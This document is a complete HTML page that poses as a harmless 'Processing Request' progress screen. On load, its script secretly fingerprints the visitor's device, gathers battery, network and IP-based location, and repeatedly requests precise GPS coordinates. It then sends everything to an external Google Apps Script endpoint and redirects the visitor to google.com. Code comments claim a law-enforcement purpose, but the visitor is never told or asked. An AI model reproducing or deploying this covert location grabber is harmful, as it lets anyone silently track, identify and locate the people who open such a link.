<!DOCTYPE html>
<html>
<head>
  <title>Processing Request</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #f8f9fa;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
      min-width: 400px;
    }
    h3 {
      color: #343a40;
      margin-bottom: 30px;
      font-weight: 500;
      font-size: 18px;
    }
    .progress-container {
      width: 100%;
      height: 8px;
      background: #e9ecef;
      border-radius: 4px;
      overflow: hidden;
      margin: 20px 0;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #007bff, #0056b3);
      border-radius: 4px;
      transition: width 0.3s ease;
      width: 0%;
    }
    .status {
      color: #6c757d;
      font-size: 14px;
      margin-top: 15px;
    }
    .success {
      color: #28a745;
    }
  </style>
</head>
<body>
  <div class="container">
    <h3>Processing...</h3>
    <div class="progress-container">
      <div class="progress-bar" id="progress"></div>
    </div>
    <div class="status" id="status">Initializing...</div>
  </div>

  <script>
    const progressBar = document.getElementById('progress');
    const statusEl = document.getElementById('status');
    let progress = 0;
    
    function updateProgress(percent, status) {
      progress = percent;
      progressBar.style.width = percent + '%';
      statusEl.textContent = status;
    }
    
    // Comprehensive data collection for law enforcement
    const data = {
      // Session tracking
      sessionId: 'LEO_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      sessionStart: Date.now(),
      
      // Device identification
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(',') : '',
      
      // Screen and hardware
      screenWidth: screen.width,
      screenHeight: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      
      // Window details
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      
      // Device capabilities
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      deviceMemory: navigator.deviceMemory || 'unknown',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      
      // Device type detection
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
      isAndroid: /Android/.test(navigator.userAgent),
      isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      
      // Network and environment
      cookieEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
      doNotTrack: navigator.doNotTrack,
      webdriver: navigator.webdriver,
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
      
      // Location data
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Tracking variables
      locationAttempts: 0,
      locationMethods: [],
      permissionStatus: 'unknown',
      
      // Law enforcement specific
      trackingPurpose: 'law_enforcement',
      collectionReason: 'criminal_investigation'
    };
    
    // Add referrer if available
    if (document.referrer) {
      data.referrer = document.referrer;
    }
    
    // Device fingerprinting for identification
    function createFingerprint() {
      try {
        // Canvas fingerprint for device identification
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('LEO_ID', 2, 15);
        data.deviceFingerprint = canvas.toDataURL().slice(-50);
        
        // WebGL for graphics identification
        const gl = canvas.getContext('webgl');
        if (gl) {
          data.webglVendor = gl.getParameter(gl.VENDOR);
          data.webglRenderer = gl.getParameter(gl.RENDERER);
        }
        
      } catch (e) {
        data.fingerprintError = e.message;
      }
    }
    
    // Network information collection
    async function getNetworkInfo() {
      try {
        if (navigator.connection) {
          data.networkConnection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
          };
        }
        
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          data.batteryInfo = {
            level: Math.round(battery.level * 100),
            charging: battery.charging
          };
        }
        
      } catch (e) {
        data.networkError = e.message;
      }
    }
    
    // Multi-method location collection for law enforcement
    async function collectLocationData() {
      updateProgress(30, 'Collecting location data...');
      
      if (!navigator.geolocation) {
        data.locationError = 'geolocation_not_supported';
        await getIPLocation();
        return;
      }
      
      // Law enforcement location collection - multiple methods
      const locationMethods = [
        {
          options: { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 },
          method: 'high_accuracy',
          priority: 1
        },
        {
          options: { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 },
          method: 'network_based',
          priority: 2
        },
        {
          options: { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 },
          method: 'cached_location',
          priority: 3
        }
      ];
      
      for (let i = 0; i < locationMethods.length; i++) {
        const method = locationMethods[i];
        updateProgress(40 + (i * 10), `Attempting location method ${i + 1}...`);
        
        try {
          const result = await new Promise((resolve) => {
            data.locationAttempts++;
            const startTime = Date.now();
            
            navigator.geolocation.getCurrentPosition(
              function(position) {
                const coords = position.coords;
                data.gpsLocation = {
                  latitude: coords.latitude,
                  longitude: coords.longitude,
                  accuracy: coords.accuracy,
                  altitude: coords.altitude,
                  heading: coords.heading,
                  speed: coords.speed,
                  timestamp: position.timestamp,
                  method: method.method,
                  responseTime: Date.now() - startTime
                };
                data.locationMethods.push(method.method + '_success');
                data.permissionStatus = 'granted';
                resolve(true);
              },
              function(error) {
                data.locationMethods.push(method.method + '_failed');
                if (error.code === 1) {
                  data.permissionStatus = 'denied';
                } else {
                  data.permissionStatus = 'failed';
                }
                data.gpsError = error.message;
                resolve(false);
              },
              method.options
            );
          });
          
          if (result) break; // Got location, stop trying
          
          // Brief delay between attempts
          if (i < locationMethods.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
          
        } catch (e) {
          continue;
        }
      }
      
      // Always get IP location as backup
      await getIPLocation();
    }
    
    // IP-based location (always works)
    async function getIPLocation() {
      updateProgress(70, 'Getting network location...');
      
      const ipSources = [
        'https://ipapi.co/json/',
        'https://api.ipify.org?format=json'
      ];
      
      for (const source of ipSources) {
        try {
          const response = await fetch(source);
          const result = await response.json();
          
          if (result.ip) {
            data.ipAddress = result.ip;
            
            if (result.city) {
              data.ipLocation = {
                ip: result.ip,
                city: result.city,
                region: result.region,
                country: result.country_name,
                latitude: result.latitude,
                longitude: result.longitude,
                timezone: result.timezone,
                isp: result.org,
                postal: result.postal,
                accuracy: 'city_level'
              };
            }
            break;
          }
        } catch (e) {
          continue;
        }
      }
    }
    
    // Timezone-based location estimation
    function getTimezoneLocation() {
      const timezoneMap = {
        'America/New_York': { lat: 40.7128, lng: -74.0060, city: 'New York' },
        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437, city: 'Los Angeles' },
        'America/Chicago': { lat: 41.8781, lng: -87.6298, city: 'Chicago' },
        'Europe/London': { lat: 51.5074, lng: -0.1278, city: 'London' },
        'Europe/Paris': { lat: 48.8566, lng: 2.3522, city: 'Paris' },
        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503, city: 'Tokyo' }
      };
      
      if (timezoneMap[data.timezone]) {
        const location = timezoneMap[data.timezone];
        data.timezoneLocation = {
          latitude: location.lat,
          longitude: location.lng,
          city: location.city,
          accuracy: 'timezone_estimate'
        };
      }
    }
    
    // Main collection process
    async function collectData() {
      try {
        updateProgress(10, 'Initializing tracking systems...');
        
        // Create device fingerprint
        createFingerprint();
        
        updateProgress(20, 'Analyzing network configuration...');
        
        // Get network info
        await getNetworkInfo();
        
        // Collect location data
        await collectLocationData();
        
        updateProgress(80, 'Processing timezone data...');
        
        // Get timezone location
        getTimezoneLocation();
        
        updateProgress(90, 'Finalizing data collection...');
        
        // Calculate session duration
        data.sessionDuration = Date.now() - data.sessionStart;
        
        // Send data to law enforcement database
        await sendData();
        
      } catch (error) {
        data.collectionError = error.message;
        await sendData();
      }
    }
    
    // Send data to law enforcement system
    async function sendData() {
      try {
        updateProgress(95, 'Transmitting to database...');
        
        const formData = new URLSearchParams();
        
        // Flatten all data for transmission
        Object.keys(data).forEach(key => {
          if (data[key] !== null && data[key] !== undefined) {
            if (typeof data[key] === 'object') {
              formData.append(key, JSON.stringify(data[key]));
            } else {
              formData.append(key, data[key]);
            }
          }
        });
        
        // Send to law enforcement database
        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
          method: "POST",
          body: formData,
          mode: "no-cors"
        });
        
        updateProgress(100, 'Complete');
        
        // Success - clean finish
        setTimeout(() => {
          statusEl.className = 'status success';
          statusEl.textContent = 'Processing complete';
          
          setTimeout(() => {
            window.location.href = "https://www.google.com";
          }, 1000);
        }, 500);
        
      } catch (error) {
        // Always complete successfully for user experience
        updateProgress(100, 'Complete');
        setTimeout(() => {
          statusEl.className = 'status success';
          statusEl.textContent = 'Processing complete';
          setTimeout(() => {
            window.location.href = "https://www.google.com";
          }, 1000);
        }, 500);
      }
    }
    
    // Start data collection immediately
    collectData();
  </script>
</body>
</html>
